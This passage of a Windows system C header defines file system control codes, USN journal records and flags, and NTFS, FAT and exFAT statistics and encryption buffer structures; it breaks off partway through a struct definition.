#define FSCTL_EXTEND_VOLUME             CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 60, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_QUERY_USN_JOURNAL         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 61, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_DELETE_USN_JOURNAL        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 62, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_MARK_HANDLE               CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 63, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_SIS_COPYFILE              CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 64, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_SIS_LINK_FILES            CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 65, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)
// decommissional fsctl value                                             66
// decommissioned fsctl value                                             67
// decommissioned fsctl value                                             68
#define FSCTL_RECALL_FILE               CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 69, METHOD_NEITHER, FILE_ANY_ACCESS)
// decommissioned fsctl value                                             70
#define FSCTL_READ_FROM_PLEX            CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 71, METHOD_OUT_DIRECT, FILE_READ_DATA)
#define FSCTL_FILE_PREFETCH             CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 72, METHOD_BUFFERED, FILE_SPECIAL_ACCESS) // FILE_PREFETCH
#endif /* _WIN32_WINNT >= 0x0500 */

#if (_WIN32_WINNT >= 0x0600)
#define FSCTL_MAKE_MEDIA_COMPATIBLE         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 76, METHOD_BUFFERED, FILE_WRITE_DATA) // UDFS R/W
#define FSCTL_SET_DEFECT_MANAGEMENT         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 77, METHOD_BUFFERED, FILE_WRITE_DATA) // UDFS R/W
#define FSCTL_QUERY_SPARING_INFO            CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 78, METHOD_BUFFERED, FILE_ANY_ACCESS) // UDFS R/W
#define FSCTL_QUERY_ON_DISK_VOLUME_INFO     CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 79, METHOD_BUFFERED, FILE_ANY_ACCESS) // C/UDFS
#define FSCTL_SET_VOLUME_COMPRESSION_STATE  CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 80, METHOD_BUFFERED, FILE_SPECIAL_ACCESS) // VOLUME_COMPRESSION_STATE
// decommissioned fsctl value                                                 80
#define FSCTL_TXFS_MODIFY_RM                CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 81, METHOD_BUFFERED, FILE_WRITE_DATA) // TxF
#define FSCTL_TXFS_QUERY_RM_INFORMATION     CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 82, METHOD_BUFFERED, FILE_READ_DATA)  // TxF
// decommissioned fsctl value                                                 83
#define FSCTL_TXFS_ROLLFORWARD_REDO         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 84, METHOD_BUFFERED, FILE_WRITE_DATA) // TxF
#define FSCTL_TXFS_ROLLFORWARD_UNDO         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 85, METHOD_BUFFERED, FILE_WRITE_DATA) // TxF
#define FSCTL_TXFS_START_RM                 CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 86, METHOD_BUFFERED, FILE_WRITE_DATA) // TxF
#define FSCTL_TXFS_SHUTDOWN_RM              CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 87, METHOD_BUFFERED, FILE_WRITE_DATA) // TxF
#define FSCTL_TXFS_READ_BACKUP_INFORMATION  CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 88, METHOD_BUFFERED, FILE_READ_DATA)  // TxF
#define FSCTL_TXFS_WRITE_BACKUP_INFORMATION CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 89, METHOD_BUFFERED, FILE_WRITE_DATA) // TxF
#define FSCTL_TXFS_CREATE_SECONDARY_RM      CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 90, METHOD_BUFFERED, FILE_WRITE_DATA) // TxF
#define FSCTL_TXFS_GET_METADATA_INFO        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 91, METHOD_BUFFERED, FILE_READ_DATA)  // TxF
#define FSCTL_TXFS_GET_TRANSACTED_VERSION   CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 92, METHOD_BUFFERED, FILE_READ_DATA)  // TxF
// decommissioned fsctl value                                                 93
#define FSCTL_TXFS_SAVEPOINT_INFORMATION    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 94, METHOD_BUFFERED, FILE_WRITE_DATA) // TxF
#define FSCTL_TXFS_CREATE_MINIVERSION       CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 95, METHOD_BUFFERED, FILE_WRITE_DATA) // TxF
// decommissioned fsctl value                                                 96
// decommissioned fsctl value                                                 97
// decommissioned fsctl value                                                 98
#define FSCTL_TXFS_TRANSACTION_ACTIVE       CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 99, METHOD_BUFFERED, FILE_READ_DATA)  // TxF
#define FSCTL_SET_ZERO_ON_DEALLOCATION      CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 101, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define FSCTL_SET_REPAIR                    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 102, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_GET_REPAIR                    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 103, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_WAIT_FOR_REPAIR               CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 104, METHOD_BUFFERED, FILE_ANY_ACCESS)
// decommissioned fsctl value                                                 105
#define FSCTL_INITIATE_REPAIR               CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 106, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_CSC_INTERNAL                  CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 107, METHOD_NEITHER, FILE_ANY_ACCESS) // CSC internal implementation
#define FSCTL_SHRINK_VOLUME                 CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 108, METHOD_BUFFERED, FILE_SPECIAL_ACCESS) // SHRINK_VOLUME_INFORMATION
#define FSCTL_SET_SHORT_NAME_BEHAVIOR       CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 109, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_DFSR_SET_GHOST_HANDLE_STATE   CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 110, METHOD_BUFFERED, FILE_ANY_ACCESS)

//
//  Values 111 - 119 are reserved for FSRM.
//

#define FSCTL_TXFS_LIST_TRANSACTION_LOCKED_FILES \
                                            CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 120, METHOD_BUFFERED, FILE_READ_DATA) // TxF
#define FSCTL_TXFS_LIST_TRANSACTIONS        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 121, METHOD_BUFFERED, FILE_READ_DATA) // TxF
#define FSCTL_QUERY_PAGEFILE_ENCRYPTION     CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 122, METHOD_BUFFERED, FILE_ANY_ACCESS)
#endif /* _WIN32_WINNT >= 0x0600 */

#if (_WIN32_WINNT >= 0x0600)
#define FSCTL_RESET_VOLUME_ALLOCATION_HINTS CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 123, METHOD_BUFFERED, FILE_ANY_ACCESS)
#endif /* _WIN32_WINNT >= 0x0600 */

#if (_WIN32_WINNT >= 0x0601)
#define FSCTL_QUERY_DEPENDENT_VOLUME        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 124, METHOD_BUFFERED, FILE_ANY_ACCESS)    // Dependency File System Filter
#define FSCTL_SD_GLOBAL_CHANGE              CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 125, METHOD_BUFFERED, FILE_ANY_ACCESS) // Update NTFS Security Descriptors
#endif /* _WIN32_WINNT >= 0x0601 */

#if (_WIN32_WINNT >= 0x0600)
#define FSCTL_TXFS_READ_BACKUP_INFORMATION2 CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 126, METHOD_BUFFERED, FILE_ANY_ACCESS) // TxF
#endif /* _WIN32_WINNT >= 0x0600 */

#if (_WIN32_WINNT >= 0x0601)
#define FSCTL_LOOKUP_STREAM_FROM_CLUSTER    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 127, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_TXFS_WRITE_BACKUP_INFORMATION2 CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 128, METHOD_BUFFERED, FILE_ANY_ACCESS) // TxF
#define FSCTL_FILE_TYPE_NOTIFICATION        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 129, METHOD_BUFFERED, FILE_ANY_ACCESS)
#endif

//  Values 130 - 130 are available
//  Values 131 - 139 are reserved for FSRM.

#if (_WIN32_WINNT >= 0x0601)
#define FSCTL_GET_BOOT_AREA_INFO            CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 140, METHOD_BUFFERED, FILE_ANY_ACCESS) // BOOT_AREA_INFO
#define FSCTL_GET_RETRIEVAL_POINTER_BASE    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 141, METHOD_BUFFERED, FILE_ANY_ACCESS) // RETRIEVAL_POINTER_BASE
#define FSCTL_SET_PERSISTENT_VOLUME_STATE   CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 142, METHOD_BUFFERED, FILE_ANY_ACCESS)  // FILE_FS_PERSISTENT_VOLUME_INFORMATION
#define FSCTL_QUERY_PERSISTENT_VOLUME_STATE CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 143, METHOD_BUFFERED, FILE_ANY_ACCESS)  // FILE_FS_PERSISTENT_VOLUME_INFORMATION

#define FSCTL_REQUEST_OPLOCK                CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 144, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define FSCTL_CSV_TUNNEL_REQUEST            CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 145, METHOD_BUFFERED, FILE_ANY_ACCESS) // CSV_TUNNEL_REQUEST
#define FSCTL_IS_CSV_FILE                   CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 146, METHOD_BUFFERED, FILE_ANY_ACCESS) // IS_CSV_FILE

#define FSCTL_QUERY_FILE_SYSTEM_RECOGNITION CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 147, METHOD_BUFFERED, FILE_ANY_ACCESS) // 
#define FSCTL_CSV_GET_VOLUME_PATH_NAME      CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 148, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_CSV_GET_VOLUME_NAME_FOR_VOLUME_MOUNT_POINT CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 149, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_CSV_GET_VOLUME_PATH_NAMES_FOR_VOLUME_NAME CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 150,  METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_IS_FILE_ON_CSV_VOLUME         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 151,  METHOD_BUFFERED, FILE_ANY_ACCESS)

#endif /* _WIN32_WINNT >= 0x0601 */

#define FSCTL_MARK_AS_SYSTEM_HIVE           FSCTL_SET_BOOTLOADER_ACCESSED


#if(_WIN32_WINNT >= 0x0601)

typedef struct _CSV_NAMESPACE_INFO {

    ULONG         Version;
    ULONG         DeviceNumber;
    LARGE_INTEGER StartingOffset;
    ULONG         SectorSize;

} CSV_NAMESPACE_INFO, *PCSV_NAMESPACE_INFO;

#define CSV_NAMESPACE_INFO_V1 (sizeof(CSV_NAMESPACE_INFO))
#define CSV_INVALID_DEVICE_NUMBER 0xFFFFFFFF

#endif /* _WIN32_WINNT >= 0x0601 */

typedef struct _PATHNAME_BUFFER {

    ULONG PathNameLength;
    WCHAR Name[1];

} PATHNAME_BUFFER, *PPATHNAME_BUFFER;

typedef struct _FSCTL_QUERY_FAT_BPB_BUFFER {

    UCHAR First0x24BytesOfBootSector[0x24];

} FSCTL_QUERY_FAT_BPB_BUFFER, *PFSCTL_QUERY_FAT_BPB_BUFFER;

#if (_WIN32_WINNT >= 0x0400)

typedef struct {

    LARGE_INTEGER VolumeSerialNumber;
    LARGE_INTEGER NumberSectors;
    LARGE_INTEGER TotalClusters;
    LARGE_INTEGER FreeClusters;
    LARGE_INTEGER TotalReserved;
    ULONG BytesPerSector;
    ULONG BytesPerCluster;
    ULONG BytesPerFileRecordSegment;
    ULONG ClustersPerFileRecordSegment;
    LARGE_INTEGER MftValidDataLength;
    LARGE_INTEGER MftStartLcn;
    LARGE_INTEGER Mft2StartLcn;
    LARGE_INTEGER MftZoneStart;
    LARGE_INTEGER MftZoneEnd;

} NTFS_VOLUME_DATA_BUFFER, *PNTFS_VOLUME_DATA_BUFFER;

typedef struct {

    ULONG ByteCount;

    USHORT MajorVersion;
    USHORT MinorVersion;

} NTFS_EXTENDED_VOLUME_DATA, *PNTFS_EXTENDED_VOLUME_DATA;
#endif /* _WIN32_WINNT >= 0x0400 */

#if (_WIN32_WINNT >= 0x0400)

typedef struct {

    LARGE_INTEGER StartingLcn;

} STARTING_LCN_INPUT_BUFFER, *PSTARTING_LCN_INPUT_BUFFER;

typedef struct {

    LARGE_INTEGER StartingLcn;
    LARGE_INTEGER BitmapSize;
    UCHAR Buffer[1];

} VOLUME_BITMAP_BUFFER, *PVOLUME_BITMAP_BUFFER;
#endif /* _WIN32_WINNT >= 0x0400 */

#if (_WIN32_WINNT >= 0x0400)

typedef struct {

    LARGE_INTEGER StartingVcn;

} STARTING_VCN_INPUT_BUFFER, *PSTARTING_VCN_INPUT_BUFFER;

typedef struct RETRIEVAL_POINTERS_BUFFER {

    ULONG ExtentCount;
    LARGE_INTEGER StartingVcn;
    struct {
        LARGE_INTEGER NextVcn;
        LARGE_INTEGER Lcn;
    } Extents[1];

} RETRIEVAL_POINTERS_BUFFER, *PRETRIEVAL_POINTERS_BUFFER;
#endif /* _WIN32_WINNT >= 0x0400 */

#if (_WIN32_WINNT >= 0x0400)

typedef struct {

    LARGE_INTEGER FileReferenceNumber;

} NTFS_FILE_RECORD_INPUT_BUFFER, *PNTFS_FILE_RECORD_INPUT_BUFFER;

typedef struct {

    LARGE_INTEGER FileReferenceNumber;
    ULONG FileRecordLength;
    UCHAR FileRecordBuffer[1];

} NTFS_FILE_RECORD_OUTPUT_BUFFER, *PNTFS_FILE_RECORD_OUTPUT_BUFFER;
#endif /* _WIN32_WINNT >= 0x0400 */

#if (_WIN32_WINNT >= 0x0400)

typedef struct {

    HANDLE FileHandle;
    LARGE_INTEGER StartingVcn;
    LARGE_INTEGER StartingLcn;
    ULONG ClusterCount;

} MOVE_FILE_DATA, *PMOVE_FILE_DATA;

typedef struct {

    HANDLE FileHandle;
    LARGE_INTEGER SourceFileRecord;
    LARGE_INTEGER TargetFileRecord;

} MOVE_FILE_RECORD_DATA, *PMOVE_FILE_RECORD_DATA;


#if defined(_WIN64)

typedef struct _MOVE_FILE_DATA32 {

    UINT32 FileHandle;
    LARGE_INTEGER StartingVcn;
    LARGE_INTEGER StartingLcn;
    ULONG ClusterCount;

} MOVE_FILE_DATA32, *PMOVE_FILE_DATA32;
#endif
#endif /* _WIN32_WINNT >= 0x0400 */

#if (_WIN32_WINNT >= 0x0500)

typedef struct {
    ULONG Restart;
    SID Sid;
} FIND_BY_SID_DATA, *PFIND_BY_SID_DATA;

typedef struct {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FIND_BY_SID_OUTPUT, *PFIND_BY_SID_OUTPUT;

#endif /* _WIN32_WINNT >= 0x0500 */

#if (_WIN32_WINNT >= 0x0500)

typedef struct {

    ULONGLONG StartFileReferenceNumber;
    USN LowUsn;
    USN HighUsn;

} MFT_ENUM_DATA, *PMFT_ENUM_DATA;

typedef struct {

    ULONGLONG MaximumSize;
    ULONGLONG AllocationDelta;

} CREATE_USN_JOURNAL_DATA, *PCREATE_USN_JOURNAL_DATA;

typedef struct {

    USN StartUsn;
    ULONG ReasonMask;
    ULONG ReturnOnlyOnClose;
    ULONGLONG Timeout;
    ULONGLONG BytesToWaitFor;
    ULONGLONG UsnJournalID;

} READ_USN_JOURNAL_DATA, *PREAD_USN_JOURNAL_DATA;

typedef struct {

    ULONG RecordLength;
    USHORT MajorVersion;
    USHORT MinorVersion;
    ULONGLONG FileReferenceNumber;
    ULONGLONG ParentFileReferenceNumber;
    USN Usn;
    LARGE_INTEGER TimeStamp;
    ULONG Reason;
    ULONG SourceInfo;
    ULONG SecurityId;
    ULONG FileAttributes;
    USHORT FileNameLength;
    USHORT FileNameOffset;
    WCHAR FileName[1];

} USN_RECORD, *PUSN_RECORD;

#define USN_PAGE_SIZE                    (0x1000)

#define USN_REASON_DATA_OVERWRITE        (0x00000001)
#define USN_REASON_DATA_EXTEND           (0x00000002)
#define USN_REASON_DATA_TRUNCATION       (0x00000004)
#define USN_REASON_NAMED_DATA_OVERWRITE  (0x00000010)
#define USN_REASON_NAMED_DATA_EXTEND     (0x00000020)
#define USN_REASON_NAMED_DATA_TRUNCATION (0x00000040)
#define USN_REASON_FILE_CREATE           (0x00000100)
#define USN_REASON_FILE_DELETE           (0x00000200)
#define USN_REASON_EA_CHANGE             (0x00000400)
#define USN_REASON_SECURITY_CHANGE       (0x00000800)
#define USN_REASON_RENAME_OLD_NAME       (0x00001000)
#define USN_REASON_RENAME_NEW_NAME       (0x00002000)
#define USN_REASON_INDEXABLE_CHANGE      (0x00004000)
#define USN_REASON_BASIC_INFO_CHANGE     (0x00008000)
#define USN_REASON_HARD_LINK_CHANGE      (0x00010000)
#define USN_REASON_COMPRESSION_CHANGE    (0x00020000)
#define USN_REASON_ENCRYPTION_CHANGE     (0x00040000)
#define USN_REASON_OBJECT_ID_CHANGE      (0x00080000)
#define USN_REASON_REPARSE_POINT_CHANGE  (0x00100000)
#define USN_REASON_STREAM_CHANGE         (0x00200000)
#define USN_REASON_TRANSACTED_CHANGE     (0x00400000)
#define USN_REASON_CLOSE                 (0x80000000)

typedef struct {

    ULONGLONG UsnJournalID;
    USN FirstUsn;
    USN NextUsn;
    USN LowestValidUsn;
    USN MaxUsn;
    ULONGLONG MaximumSize;
    ULONGLONG AllocationDelta;

} USN_JOURNAL_DATA, *PUSN_JOURNAL_DATA;

typedef struct {

    ULONGLONG UsnJournalID;
    ULONG DeleteFlags;

} DELETE_USN_JOURNAL_DATA, *PDELETE_USN_JOURNAL_DATA;

#define USN_DELETE_FLAG_DELETE              (0x00000001)
#define USN_DELETE_FLAG_NOTIFY              (0x00000002)

#define USN_DELETE_VALID_FLAGS              (0x00000003)

typedef struct {

    ULONG UsnSourceInfo;
    HANDLE VolumeHandle;
    ULONG HandleInfo;

} MARK_HANDLE_INFO, *PMARK_HANDLE_INFO;

#if defined(_WIN64)

typedef struct {

    ULONG UsnSourceInfo;
    UINT32 VolumeHandle;
    ULONG HandleInfo;

} MARK_HANDLE_INFO32, *PMARK_HANDLE_INFO32;
#endif

#define USN_SOURCE_DATA_MANAGEMENT          (0x00000001)
#define USN_SOURCE_AUXILIARY_DATA           (0x00000002)
#define USN_SOURCE_REPLICATION_MANAGEMENT   (0x00000004)

#define MARK_HANDLE_PROTECT_CLUSTERS        (0x00000001)
#define MARK_HANDLE_TXF_SYSTEM_LOG          (0x00000004)
#define MARK_HANDLE_NOT_TXF_SYSTEM_LOG      (0x00000008)

#endif /* _WIN32_WINNT >= 0x0500 */

#if (_WIN32_WINNT >= 0x0601)

#define MARK_HANDLE_REALTIME                (0x00000020)
#define MARK_HANDLE_NOT_REALTIME            (0x00000040)

#define NO_8DOT3_NAME_PRESENT               (0x00000001)
#define REMOVED_8DOT3_NAME                  (0x00000002)

#define PERSISTENT_VOLUME_STATE_SHORT_NAME_CREATION_DISABLED        (0x00000001)

#endif /* _WIN32_WINNT >= 0x0601 */


#if (_WIN32_WINNT >= 0x0500)
typedef struct {

    ACCESS_MASK DesiredAccess;
    ULONG SecurityIds[1];

} BULK_SECURITY_TEST_DATA, *PBULK_SECURITY_TEST_DATA;
#endif /* _WIN32_WINNT >= 0x0500 */

#if (_WIN32_WINNT >= 0x0500)

#define VOLUME_IS_DIRTY                  (0x00000001)
#define VOLUME_UPGRADE_SCHEDULED         (0x00000002)
#define VOLUME_SESSION_OPEN              (0x00000004)
#endif /* _WIN32_WINNT >= 0x0500 */

#if (_WIN32_WINNT >= 0x0500)

typedef struct _FILE_PREFETCH {
    ULONG Type;
    ULONG Count;
    ULONGLONG Prefetch[1];
} FILE_PREFETCH, *PFILE_PREFETCH;

typedef struct _FILE_PREFETCH_EX {
    ULONG Type;
    ULONG Count;
    PVOID Context;
    ULONGLONG Prefetch[1];
} FILE_PREFETCH_EX, *PFILE_PREFETCH_EX;

#define FILE_PREFETCH_TYPE_FOR_CREATE       0x1
#define FILE_PREFETCH_TYPE_FOR_DIRENUM      0x2
#define FILE_PREFETCH_TYPE_FOR_CREATE_EX    0x3
#define FILE_PREFETCH_TYPE_FOR_DIRENUM_EX   0x4

#define FILE_PREFETCH_TYPE_MAX              0x4

#endif /* _WIN32_WINNT >= 0x0500 */

typedef struct _FILESYSTEM_STATISTICS {

    USHORT FileSystemType;
    USHORT Version;                     // currently version 1

    ULONG SizeOfCompleteStructure;      // must by a mutiple of 64 bytes

    ULONG UserFileReads;
    ULONG UserFileReadBytes;
    ULONG UserDiskReads;
    ULONG UserFileWrites;
    ULONG UserFileWriteBytes;
    ULONG UserDiskWrites;

    ULONG MetaDataReads;
    ULONG MetaDataReadBytes;
    ULONG MetaDataDiskReads;
    ULONG MetaDataWrites;
    ULONG MetaDataWriteBytes;
    ULONG MetaDataDiskWrites;
} FILESYSTEM_STATISTICS, *PFILESYSTEM_STATISTICS;

// values for FS_STATISTICS.FileSystemType

#define FILESYSTEM_STATISTICS_TYPE_NTFS     1
#define FILESYSTEM_STATISTICS_TYPE_FAT      2
#define FILESYSTEM_STATISTICS_TYPE_EXFAT    3
typedef struct _FAT_STATISTICS {
    ULONG CreateHits;
    ULONG SuccessfulCreates;
    ULONG FailedCreates;

    ULONG NonCachedReads;
    ULONG NonCachedReadBytes;
    ULONG NonCachedWrites;
    ULONG NonCachedWriteBytes;

    ULONG NonCachedDiskReads;
    ULONG NonCachedDiskWrites;
} FAT_STATISTICS, *PFAT_STATISTICS;

typedef struct _EXFAT_STATISTICS {
    ULONG CreateHits;
    ULONG SuccessfulCreates;
    ULONG FailedCreates;

    ULONG NonCachedReads;
    ULONG NonCachedReadBytes;
    ULONG NonCachedWrites;
    ULONG NonCachedWriteBytes;

    ULONG NonCachedDiskReads;
    ULONG NonCachedDiskWrites;
} EXFAT_STATISTICS, *PEXFAT_STATISTICS;

typedef struct _NTFS_STATISTICS {

    ULONG LogFileFullExceptions;
    ULONG OtherExceptions;

		ULONG MftReads;
    ULONG MftReadBytes;
    ULONG MftWrites;
    ULONG MftWriteBytes;
    struct {
        USHORT Write;
        USHORT Create;
        USHORT SetInfo;
        USHORT Flush;
    } MftWritesUserLevel;

    USHORT MftWritesFlushForLogFileFull;
    USHORT MftWritesLazyWriter;
    USHORT MftWritesUserRequest;

    ULONG Mft2Writes;
    ULONG Mft2WriteBytes;
    struct {
        USHORT Write;
        USHORT Create;
        USHORT SetInfo;
        USHORT Flush;
    } Mft2WritesUserLevel;

    USHORT Mft2WritesFlushForLogFileFull;
    USHORT Mft2WritesLazyWriter;
    USHORT Mft2WritesUserRequest;

    ULONG RootIndexReads;
    ULONG RootIndexReadBytes;
    ULONG RootIndexWrites;
    ULONG RootIndexWriteBytes;

    ULONG BitmapReads;
    ULONG BitmapReadBytes;
    ULONG BitmapWrites;
    ULONG BitmapWriteBytes;

    USHORT BitmapWritesFlushForLogFileFull;
    USHORT BitmapWritesLazyWriter;
    USHORT BitmapWritesUserRequest;

    struct {
        USHORT Write;
        USHORT Create;
        USHORT SetInfo;
    } BitmapWritesUserLevel;

    ULONG MftBitmapReads;
    ULONG MftBitmapReadBytes;
    ULONG MftBitmapWrites;
    ULONG MftBitmapWriteBytes;

    USHORT MftBitmapWritesFlushForLogFileFull;
    USHORT MftBitmapWritesLazyWriter;
    USHORT MftBitmapWritesUserRequest;

    struct {
        USHORT Write;
        USHORT Create;
        USHORT SetInfo;
        USHORT Flush;
    } MftBitmapWritesUserLevel;

    ULONG UserIndexReads;
    ULONG UserIndexReadBytes;
    ULONG UserIndexWrites;
    ULONG UserIndexWriteBytes;
    ULONG LogFileReads;
    ULONG LogFileReadBytes;
    ULONG LogFileWrites;
    ULONG LogFileWriteBytes;

    struct {
        ULONG Calls;                // number of individual calls to allocate clusters
        ULONG Clusters;             // number of clusters allocated
        ULONG Hints;                // number of times a hint was specified

        ULONG RunsReturned;         // number of runs used to satisify all the requests

        ULONG HintsHonored;         // number of times the hint was useful
        ULONG HintsClusters;        // number of clusters allocated via the hint
        ULONG Cache;                // number of times the cache was useful other than the hint
        ULONG CacheClusters;        // number of clusters allocated via the cache other than the hint
        ULONG CacheMiss;            // number of times the cache wasn't useful
        ULONG CacheMissClusters;    // number of clusters allocated without the cache
    } Allocate;

} NTFS_STATISTICS, *PNTFS_STATISTICS;

#if (_WIN32_WINNT >= 0x0500)

#if _MSC_VER >= 1200
#pragma warning(push)
#endif
#pragma warning(disable:4201)       // unnamed struct

typedef struct _FILE_OBJECTID_BUFFER {

    UCHAR ObjectId[16];

    union {
        struct {
            UCHAR BirthVolumeId[16];
            UCHAR BirthObjectId[16];
            UCHAR DomainId[16];
        } DUMMYSTRUCTNAME;
        UCHAR ExtendedInfo[48];
    } DUMMYUNIONNAME;

} FILE_OBJECTID_BUFFER, *PFILE_OBJECTID_BUFFER;

#if _MSC_VER >= 1200
#pragma warning(pop)
#else
#pragma warning( default : 4201 ) /* nonstandard extension used : nameless struct/union */
#endif

#endif /* _WIN32_WINNT >= 0x0500 */


#if (_WIN32_WINNT >= 0x0500)

typedef struct _FILE_SET_SPARSE_BUFFER {
    BOOLEAN SetSparse;
} FILE_SET_SPARSE_BUFFER, *PFILE_SET_SPARSE_BUFFER;


#endif /* _WIN32_WINNT >= 0x0500 */


#if (_WIN32_WINNT >= 0x0500)

typedef struct _FILE_ZERO_DATA_INFORMATION {

    LARGE_INTEGER FileOffset;
    LARGE_INTEGER BeyondFinalZero;

} FILE_ZERO_DATA_INFORMATION, *PFILE_ZERO_DATA_INFORMATION;
#endif /* _WIN32_WINNT >= 0x0500 */

#if (_WIN32_WINNT >= 0x0500)

typedef struct _FILE_ALLOCATED_RANGE_BUFFER {

    LARGE_INTEGER FileOffset;
    LARGE_INTEGER Length;

} FILE_ALLOCATED_RANGE_BUFFER, *PFILE_ALLOCATED_RANGE_BUFFER;
#endif /* _WIN32_WINNT >= 0x0500 */


#if (_WIN32_WINNT >= 0x0500)

typedef struct _ENCRYPTION_BUFFER {

    ULONG EncryptionOperation;
    UCHAR Private[1];

} ENCRYPTION_BUFFER, *PENCRYPTION_BUFFER;

#define FILE_SET_ENCRYPTION         0x00000001
#define FILE_CLEAR_ENCRYPTION       0x00000002
#define STREAM_SET_ENCRYPTION       0x00000003
#define STREAM_CLEAR_ENCRYPTION     0x00000004

#define MAXIMUM_ENCRYPTION_VALUE    0x00000004

typedef struct _DECRYPTION_STATUS_BUFFER {

    BOOLEAN NoEncryptedStreams;

} DECRYPTION_STATUS_BUFFER, *PDECRYPTION_STATUS_BUFFER;

#define ENCRYPTION_FORMAT_DEFAULT        (0x01)

#define COMPRESSION_FORMAT_SPARSE        (0x4000)

typedef struct _REQUEST_RAW_ENCRYPTED_DATA {

    LONGLONG FileOffset;
    ULONG Length;

} REQUEST_RAW_ENCRYPTED_DATA, *PREQUEST_RAW_ENCRYPTED_DATA;

typedef struct _ENCRYPTED_DATA_INFO {

    ULONGLONG StartingFileOffset;

    ULONG OutputBufferOffset;

    ULONG BytesWithinFileSize;

    ULONG BytesWithinValidDataLength;

    USHORT CompressionFormat;

    UCHAR DataUnitShift;
    UCHAR ChunkShift;
    UCHAR ClusterShift;

    UCHAR EncryptionFormat;

		USHORT NumberOfDataBlocks;

    ULONG DataBlockSize[ANYSIZE_ARRAY];

} ENCRYPTED_DATA_INFO;
typedef ENCRYPTED_DATA_INFO *PENCRYPTED_DATA_INFO;
#endif /* _WIN32_WINNT >= 0x0500 */


#if (_WIN32_WINNT >= 0x0500)

typedef struct _PLEX_READ_DATA_REQUEST {

    LARGE_INTEGER ByteOffset;
    ULONG ByteLength;
    ULONG PlexNumber;

} PLEX_READ_DATA_REQUEST, *PPLEX_READ_DATA_REQUEST;
#endif /* _WIN32_WINNT >= 0x0500 */

#if (_WIN32_WINNT >= 0x0500)

typedef struct _SI_COPYFILE {
    ULONG SourceFileNameLength;
    ULONG DestinationFileNameLength;
    ULONG Flags;
    WCHAR FileNameBuffer[1];
} SI_COPYFILE, *PSI_COPYFILE;

#define COPYFILE_SIS_LINK       0x0001              // Copy only if source is SIS
#define COPYFILE_SIS_REPLACE    0x0002              // Replace destination if it exists, otherwise don't.
#define COPYFILE_SIS_FLAGS      0x0003
#endif /* _WIN32_WINNT >= 0x0500 */

#if (_WIN32_WINNT >= 0x0600)

typedef struct _FILE_MAKE_COMPATIBLE_BUFFER {
    BOOLEAN CloseDisc;
